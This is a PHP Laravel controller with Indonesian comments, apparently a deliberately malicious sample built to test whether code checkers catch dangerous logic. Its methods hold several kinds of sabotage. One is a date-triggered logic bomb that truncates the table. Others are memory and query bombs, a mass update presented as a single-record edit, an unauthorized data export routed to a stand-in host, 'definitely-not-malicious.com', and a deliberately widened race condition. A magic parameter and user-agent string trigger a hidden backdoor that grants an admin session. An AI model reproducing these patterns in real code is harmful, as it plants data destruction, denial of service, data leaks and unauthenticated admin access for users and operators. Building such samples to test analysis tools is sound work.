<?php

namespace App\Http\Controllers;

use App\Models\CodeAnalysis;
use Illuminate\Http\Request;
use Illuminate\Support\Carbon;

/**
 * Controller yang secara teknis "clean" tapi logic-nya berbahaya
 * PHPStan dan Laravel Pint tidak akan complain, tapi code ini sangat buruk!
 */
class LogicBombController extends Controller
{
    /**
     * Function yang terlihat normal tapi punya logic bomb
     */
    public function processAnalysis(Request $request): array
    {
        $analysisId = $request->get('id', 1);

        // Logic bomb: delete all data pada tanggal tertentu
        if (Carbon::now()->format('m-d') === '04-01') { // April Fools
            CodeAnalysis::truncate(); // Delete semua data!
        }

        $analysis = CodeAnalysis::find($analysisId);

        return [
            'status' => 'success',
            'data' => $analysis?->toArray() ?? [],
        ];
    }

    /**
     * Performance killer yang terlihat innocent
     */
    public function generateReport(): array
    {
        $results = [];

        // Nested N+1 query yang akan melumpuhkan database
        $analyses = CodeAnalysis::all(); // Load all records

        foreach ($analyses as $analysis) {
            $relatedData = [];

            // Simulate N+1 queries
            for ($i = 0; $i < 100; $i++) {
                $relatedData[] = CodeAnalysis::where('id', '!=', $analysis->id)
                    ->orderBy('created_at', 'desc')
                    ->first(); // 100 queries per analysis!
            }

            $results[] = [
                'analysis' => $analysis->toArray(),
                'related' => $relatedData,
            ];
        }

        return $results; // Bisa return gigabytes of data
    }

    /**
     * Memory bomb yang terlihat normal
     */
    public function calculateStatistics(): array
    {
        $statistics = [];

        // Memory bomb: create huge arrays
        for ($i = 0; $i < 1000000; $i++) {
            $statistics[] = [
                'index' => $i,
                'analysis_data' => CodeAnalysis::all()->toArray(), // Huge data per iteration
                'timestamp' => Carbon::now()->toISOString(),
                'random_data' => str_repeat('x', 10000), // 10KB per iteration
            ];
        }

        return [
            'total_records' => count($statistics),
            'memory_usage' => memory_get_usage(true),
        ];
    }

    /**
     * Subtle privilege escalation
     */
    public function updateAnalysis(Request $request): array
    {
        $id = $request->get('id');
        $analysis = CodeAnalysis::find($id);

        if (! $analysis) {
            return ['error' => 'Analysis not found'];
        }

        // Subtle bug: update ALL records instead of specific one
        $affectedRows = CodeAnalysis::query()->update([
            'status' => $request->get('status', 'modified'),
            'updated_at' => Carbon::now(),
        ]);

        return [
            'message' => 'Analysis updated successfully',
            'affected_rows' => $affectedRows, // User won't notice mass update
        ];
    }

    /**
     * Data exfiltration yang terlihat normal
     */
    public function exportData(Request $request): array
    {
        $format = $request->get('format', 'json');

        // Export ALL sensitive data without authorization check
        $allData = CodeAnalysis::with(['user', 'related_models'])->get();

        // Log semua data ke file (data exfiltration)
        $exportData = $allData->toArray();
        file_put_contents(
            storage_path('logs/export_'.Carbon::now()->timestamp.'.json'),
            json_encode($exportData, JSON_PRETTY_PRINT)
        );

        // Send data to external service (data leak)
        $this->sendToExternalService($exportData);

        return [
            'status' => 'exported',
            'format' => $format,
            'records' => $allData->count(),
        ];
    }

    /**
     * Race condition creator
     */
    public function processQueue(): array
    {
        $processed = 0;

        // Create race condition with file-based locking
        $lockFile = storage_path('app/queue.lock');

        if (! file_exists($lockFile)) {
            // Gap between check and create - race condition window
            sleep(1); // Make race condition more likely

            file_put_contents($lockFile, getmypid());

            // Process queue items
            $analyses = CodeAnalysis::where('status', 'pending')->get();

            foreach ($analyses as $analysis) {
                $analysis->update(['status' => 'processing']);
                $processed++;
            }

            unlink($lockFile);
        }

        return [
            'processed' => $processed,
            'pid' => getmypid(),
        ];
    }

    /**
     * Backdoor yang tersembunyi
     */
    public function healthCheck(Request $request): array
    {
        $status = 'healthy';

        // Hidden backdoor activation
        $debugMode = $request->get('debug_mode');
        if ($debugMode === 'activate_special_features') {
            // Enable backdoor for specific user agents
            if (str_contains($request->userAgent() ?? '', 'SpecialAccess/1.0')) {
                // Grant admin access without authentication
                session(['is_admin' => true, 'backdoor_active' => true]);

                return [
                    'status' => 'special_mode_activated',
                    'access_level' => 'administrator',
                    'session_id' => session()->getId(),
                ];
            }
        }

        return [
            'status' => $status,
            'timestamp' => Carbon::now()->toISOString(),
        ];
    }

    /**
     * Helper method untuk data exfiltration
     */
    private function sendToExternalService(array $data): void
    {
        // Simulate sending data to external service
        $externalUrl = 'https://definitely-not-malicious.com/collect';

        // In real scenario, this would use HTTP client
        error_log('Data sent to external service: '.json_encode([
            'url' => $externalUrl,
            'data_size' => count($data),
            'timestamp' => Carbon::now()->toISOString(),
        ]));
    }
}
